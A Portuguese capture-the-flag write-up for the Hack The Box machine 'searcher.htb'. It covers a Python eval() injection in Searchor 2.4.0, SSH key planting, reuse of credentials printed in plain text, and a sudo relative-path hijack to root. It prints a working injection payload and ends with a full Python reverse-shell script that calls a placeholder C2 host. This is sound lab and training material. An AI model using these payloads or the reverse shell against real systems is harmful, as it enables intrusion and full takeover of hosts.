@@ -1,0 +1,349 @@
+### USER.TXT
+
+Ao abrir o IP do desafio, temos erro na tentativa de acesso e um aparente redirecionamento para **searcher.htb:**
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a3c92f95-ed44-448d-9a4a-bf74ce535c31/Untitled.png)
+
+O scan de portas com **Nmap** nos trouxe o seguinte resultado:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/676e14cd-38f5-44ed-bab2-d5fe8d933157/Untitled.png)
+
+Indicando que temos as portas **22** e **80** abertas, mas por que não conseguimos acessar pelo browser a porta **80**, visto que é um servidor web Apache?
+
+O ping para o endereço também funciona normalmente:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/524e58b3-4789-44b4-b788-fa13a4f9bd39/Untitled.png)
+
+Na tentativa de achar algum path dentro desta URL não encontramos nada de interessante.
+
+Então, adicionamos o IP com seu redirecionamento ao arquivo **/etc/hosts,** após algumas tentativas falhas como a de adicionar o IP para outro, chegamos no seguinte registro:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ce850ed4-51ad-49fc-91bb-29be8a14b685/Untitled.png)
+
+Dessa forma, se tornou possível o acesso a aplicação através do endereço **searcher.htb**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a0e7da02-66f6-429d-be5c-e1759e4fe427/Untitled.png)
+
+**OBS: O site estava inacessível anteriormente devido a algum tipo de problema na resolução de DNS do IP, adicionando este registro ao arquivo /etc/hosts bypassou este problema visto que este arquivo é verificado primeiro antes da fase de resolução de DNS, tornando o site acessível após registrá-lo corretamente.**
+
+Agora com acesso ao site, podemos observar suas funções.
+
+Conseguimos determinar que a função do site é nos trazer uma URL de pesquisa pronta de acordo com o mecanismo de busca selecionado (google, yahoo…), ou seja, inserindo o input abaixo:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c483097a-ad15-4604-b16d-ea39f78dd092/Untitled.png)
+
+Temos como resultado a URL para esta pesquisa no google:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/faff530a-a3bd-4a05-82b3-af032b0677fa/Untitled.png)
+
+E em caso de selecionar o botão **Auto redirect** somos automaticamente redirecionados para a URL criada.
+
+Olhando para a requisição no BURP, é possível claro alterar os valores dos 2 parâmetros mas  a princípio não foi encontrado nenhum injection nas tentativas para **SQL** por exemplo:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9631cd09-b4e0-4ee3-9990-c154e5224031/Untitled.png)
+
+O site também nos traz algumas informações sobre ferramentas e versões no seu rodapé:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/214a2067-c2f7-4f93-93a6-2b818089b8cd/Untitled.png)
+
+Pesquisando sobre a ferramenta Searchor identificamos sua função, que é descrita em seu github como:
+
+Searchor is an all-in-one PyPi Python Library that simplifies web scraping, obtaining information on an topic, and generating search query URLs.
+
+Pesquisando por vulnerabilidades especificas a sua versão, encontramos o seguinte
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/049e4df2-db30-46ce-941c-a9efa262c814/Untitled.png)
+
+Indicando que temos um RCE em versões abaixo da 2.4.2, como nossa versão está em 2.4.0 resolvemos tentar esta vulnerabilidade. Nos detalhes da mesma, temos como referência um commit no github:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2d7eec11-e86c-46be-a79e-73a0f21220c0/Untitled.png)
+
+Nele é possível identificar a parte vulnerável no código, que foi corrigida nas versões 2.4.2 para cima:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6eb9003e-e015-4e5f-936a-2b7dfa4f11ae/Untitled.png)
+
+O código é vulnerável pois temos uma função **eval()** na função chamada **search** que leva como parâmetro inputs definidos pelo usuário (**engine e query**).
+
+Já vimos que conseguimos manipular estes dois valores na requisição e que a versão do Searchor utilizada provavelmente possui esta função em seu código, o que indica que podemos tentar escapar o input dos parâmetros **engine** ou **query** para tentar inserir valores arbitrários diretamente na função **eval().**
+
+Com isso, iniciamos as tentativas no parâmetro **query.** Após muitas tentativas mal sucedidas, ao perceber que a ferramenta (**Searchor**) é criada em Python:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fbec365d-d1a2-4bb4-ae11-bf388edb8637/Untitled.png)
+
+chegamos ao seguinte payload:
+
+```python
+' + __import__('os').system('id'))#
+```
+
+Convertendo este payload para URL Encoded para que passe na requisição temos o command injection como resultado:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/64234f8d-70df-490d-bfe8-72f4856cde1e/Untitled.png)
+
+Com a inserção do Payload, a query executada no servidor ficou da seguinte forma:
+
+```python
+eval(f"Engine.Google.search('' + __import__('os').system('id'))#', copy_url={copy}, open_web={open})")
+```
+
+Onde **#** comenta o restante do código.
+
+Com este RCE conseguimos capturar a **flag user**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/359b8300-16b9-4e14-b294-400364a45624/Untitled.png)
+
+Agora precisamos escalar o privilégio na máquina para conseguir a flag **root**.
+
+Após diversas tentativas mal sucedidas de inserir um reverse shell no RCE acima, nos recordamos que la no início, no scan de portas do Nmap, também foi identificada a porta 22 aberta.
+
+Verificamos então o arquivo de configurações do SSH para definir como podemos entrar via este protocolo, este arquivo fica em **/etc/ssh/sshd_config**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/03515caf-853e-439b-ae57-5d0aa1e3e369/Untitled.png)
+
+Neste arquivo, 2 fatores são importantes de serem observados:
+
+- **AuthorizedKeysFile**:
+    - Aqui indica-se onde as chaves públicas serão procuradas no momento do login via SSH:
+        
+        ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31d78f22-2ff6-48ed-811c-ebda067f1567/Untitled.png)
+        
+        Neste caso, podemos perceber que as chaves serão procuradas no arquivo **authorized_keys** e no arquivo **authorized_keys2** dentro da pasta **.ssh/** no diretório **/home** do usuário.
+        
+- **PubkeyAuthentication**:
+    - Aqui indica-se que o serviço SSH aceita login via chave pública, o que significa que se nossa chave pública estiver presente no arquivo authorized_keys no servidor, conseguiremos logar sem senha:
+        
+        ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5af0f12c-1d89-4d6d-b22f-1b67b7f704b1/Untitled.png)
+        
+
+Com estas informações, procuramos na pasta **/home** do usuário **svc** a pasta **.ssh:**
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6deacef3-9d64-4c32-a2b0-d971c7b263ef/Untitled.png)
+
+Podemos reparar que esta pasta não existe, como temos permissão de escrita no diretório do próprio usuário podemos criá-la juntamente com o arquivo **authorized_keys** dentro dela:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0f9f6318-e81a-4662-b5ab-87c79d27470f/Untitled.png)
+
+Primeiro criamos a pasta **.ssh**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7e8ba5ce-31be-4146-9b83-866256322109/Untitled.png)
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d5b41141-6463-422f-8ace-a4ffde2fde9a/Untitled.png)
+
+E então o arquivo **authorized_keys** dentro dela:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/69eee0cc-7c1f-461c-815e-5613bfb98e72/Untitled.png)
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b038b834-9840-4893-bd39-abd73811d689/Untitled.png)
+
+Dentro deste arquivo, precisamos colocar nossa public key, que pode ser encontrada também na pasta **.ssh** no arquivo **id_rsa.pub**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/32c97a1e-4f77-488b-936a-ccb82f4bf8ce/Untitled.png)
+
+Copiamos o conteúdo deste arquivo e inserimos no arquivo **authorized_keys** no servidor via **RCE**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/465a17a2-6bec-4fa6-ac83-934429266857/Untitled.png)
+
+**OBS: Sem esquecer dar URL ENCODED**
+
+Verificando o conteúdo do arquivo para saber se a chave foi mesmo salva no mesmo:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/470a909a-a832-4364-b1b9-6a9873988f64/Untitled.png)
+
+Agora, ao tentarmos executar login via SSH com o usuário **svc** com o comando abaixo:
+
+```python
+ssh -vvv svc@10.10.11.208
+```
+
+A senha ainda é solicitada, indicando que a **public key** não está funcionando, porém no verbose do comando, podemos verificar que a chave foi oferecida:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/717aa5df-132f-4e05-8b4b-ea92c40c2d90/Untitled.png)
+
+Ao pesquisar, encontramos a informação de que as permissões na pasta .ssh e nos arquivos nela presentes devem ser setados da seguinte forma:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ee7ca2d1-8505-4cd0-908c-d718b5909a75/Untitled.png)
+
+Setamos então as devidas permissões:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d5e189bf-e50a-4bbb-aef4-5f46b4dfc27d/Untitled.png)
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c90c9000-992c-4519-9985-883539e928cc/Untitled.png)
+
+E com isso, conseguimos logar **via ssh** com o usuário **svc**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/018f5308-44d2-4b38-9186-1a10f6c46833/Untitled.png)
+
+A partir daqui, precisamos iniciar o processe de escalação de privilégios.
+
+### ROOT.TXT
+
+Tentamos utilizar o comando **sudo -l** para entender quais os privilégios do usuário **svc,** porém precisamos da senha, informações que não temos no momento.
+
+Na pasta da aplicação, encontramos a pasta **.git,** que possui informações de versionamento ****da aplicação:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f91ad6bd-05d2-40d0-99c8-5ee976a34d01/Untitled.png)
+
+Tentando iniciar o git nesta pasta com **git init**, temos permissão negada:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/07f9f6b8-ab26-46d4-8372-10ee95835737/Untitled.png)
+
+Lendo os arquivos achamos a seguinte informação no arquivo **config**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5dee588-93e0-46ce-a225-4a7812b581cc/Untitled.png)
+
+Na URL podemos perceber um padrão que se assemelha a usuário e senha em:
+
+**cody:jh1usoih2bkjaspwe92**
+
+Tentamos então logar via SSH com estas credenciais, sem sucesso:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa6be95b-a236-4e2e-bb1c-a86a24d4cc1e/Untitled.png)
+
+Observando no arquivo /etc/passwd vimos que o usuário **cody** não existe no sistema:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f055a8fa-5181-4de3-b151-b92362940daa/Untitled.png)
+
+Na máquina temos apenas 2 usuários válidos:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4929984-9d33-4c2f-b23c-6a2723501d06/Untitled.png)
+
+Tentamos então utilizar a senha encontrada pro usuário **svc** e obtemos sucesso no comando **sudo -l**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b0deefe1-44ec-42b2-93c3-87c6eccf5a04/Untitled.png)
+
+Com isso, é possível observar que o usuário pode executar o comando citado como root:
+
+**/usr/bin/python3 /opt/scripts/system-checkup.py ***
+
+Tentando rodar o comando temos:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/29c4cf49-a2c2-4c0e-ac53-3b7b875e1e84/Untitled.png)
+
+Podemos rodar o comando com cada um dos argumentos mostrados:
+
+- **docker-ps**
+    
+    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e84e1ef1-d6f3-410f-9ae4-51005a37879c/Untitled.png)
+    
+
+- **docker-inspect**
+    
+    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/73f258af-e140-4b77-a197-32a26116bd13/Untitled.png)
+    
+- **full-checkup**
+    
+    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/055fd5ca-955c-46a6-9417-a2000624bdce/Untitled.png)
+    
+
+Acessamos então a pasta **/opt/scripts/** para verificar o conteúdo do script **system-checkup.py**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/950c66e1-7568-4722-ab73-62f6d4a296f8/Untitled.png)
+
+Porém, não temos permissão de leitura em nenhum dos arquivos da pasta.
+
+Também temos uma outra pasta **.git** que também não temos acesso.
+
+Voltando aos comandos que podem ser executados, analisamos melhor o comando docker-inspect, que aparentemente necessita de outros parâmetros para rodar, sendo estes **<format>** e **<container_name>.** O nome dos containers ja foi descoberto através do script d**ocker-ps**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e84e1ef1-d6f3-410f-9ae4-51005a37879c/Untitled.png)
+
+Sendo 2:
+
+- **gitea**
+- **mysql_db**
+
+Precisamos então do formato.
+
+Pesquisando por **docker-inspect** caímos na documentação deste comando, onde identificamos que o comando tem o papel de retornar informações de baixo nível do objeto Docker selecionado, além disso, conseguimos visualizar alguns formatos que podem ser utilizados, dentre eles o **json**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9dbc6acf-5090-44f1-a4cd-3deea66452b0/Untitled.png)
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0b94172b-3f80-4fb7-b548-eda8428a6603/Untitled.png)
+
+Utilizamos então este formato para rodar o script no docker **gitea** e temos o seguinte resultado:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da6fa12e-2af2-4afe-b512-c56c301139d7/Untitled.png)
+
+Neste arquivo, como podemos ver, temos dump inclusive de usuário e senha do BD.
+
+O mesmo ocorre para o docker **mysq_db**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/519f3c4d-774f-4ff5-a265-ccd3bbca1b09/Untitled.png)
+
+Com alguma pesquisa, voltamos ao início do desafio, quando achamos a a senha do usuário **scv** no arquivo **config**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5dee588-93e0-46ce-a225-4a7812b581cc/Untitled.png)
+
+Trocamos no nosso arquivo **/etc/hosts searcher.htb** para **gitea.searcher.htb**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fef46829-7d4f-4a6c-8333-8aa4faca8ff2/Untitled.png)
+
+Com isso, temos acesso a instância do **gitea** na web:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6dbc51df-8b7d-49aa-8e4b-c5861c54dffe/Untitled.png)
+
+Logando com a conta do **cody** encontrada no mesmo arquivo:
+
+**cody:jh1usoih2bkjaspwe92**
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b94813d6-42c6-4e8e-9a15-6e8be5fde264/Untitled.png)
+
+Podemos ver que também existe um usuário administrator commitando no projeto:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/03ada8c0-594e-48a6-bea6-11cd64946940/Untitled.png)
+
+Tentamos então logar com este usuário utilizando a senha encontrada ao dumpar o arquivo do **docker gitea**:
+
+**administrator:yuiu1hoiu4i5ho1uh**
+
+Logamos com sucesso:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/287a8a5e-eaf0-4cbf-9402-77c32972d179/Untitled.png)
+
+E podemos ler os scripts que inicialmente eram inacessíveis ao usuário **svc**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7b29f780-1643-4282-a20e-564b1ec696f9/Untitled.png)
+
+Observando o arquivo [full-checkup.sh](http://full-checkup.sh) entendemos por que o script **full-chekup** não estava rodando, trazendo o erro **something went wrong**:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e021e8d3-56d7-475e-9976-3f68e7032845/Untitled.png)
+
+É possível visualizar que o comando se utiliza da variável chamada **arg_list** para definir o arquivo [**full-checkup.sh**](http://full-checkup.sh) utilizando-se de **relative path,** que significa que este script só roda em uma pasta que tenha este arquivo ([**full-checkup.sh**](http://full-checkup.sh)). Como comprovação disso, podemos rodar o comando dentro da própria pasta **/opt/scripts** que já possui o arquivo **full-checkup.sh** criado:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/04b93f91-eaad-43d9-8a5d-0bcb51830b86/Untitled.png)
+
+Não estávamos conseguindo rodar o comando inicialmente pois estávamos tentando rodá-lo de uma pasta que não tinha o arquivo **full-checkup.sh.** 
+
+Sabendo deste comportamento, podemos criar este arquivo em uma pasta em que temos permissão de escrita como a **/tmp** e rodar o comando de la:
+
+Criamos na pasta **/tmp** o arquivo **[full-checkup.sh](http://full-checkup.sh)** da seguinte forma:
+
+```python
+#!/usr/bin/python3
+import os
+os.system('cat /root/root.txt')
+```
+
+Damos permissão de execução a este arquivo, e rodamos:
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cbce5661-5b28-403d-8a60-178b902edcb3/Untitled.png)
+
+Conseguindo assim a **flag de root**.
+
+OBS: Poderíamos rodar qualquer comando neste arquivo, como por exemplo:
+
+```python
+#!/usr/bin/python3
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<c2-ipv4>",<c2-port>))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("sh")
+```
+
+Para conseguir um shell com permissões do root.
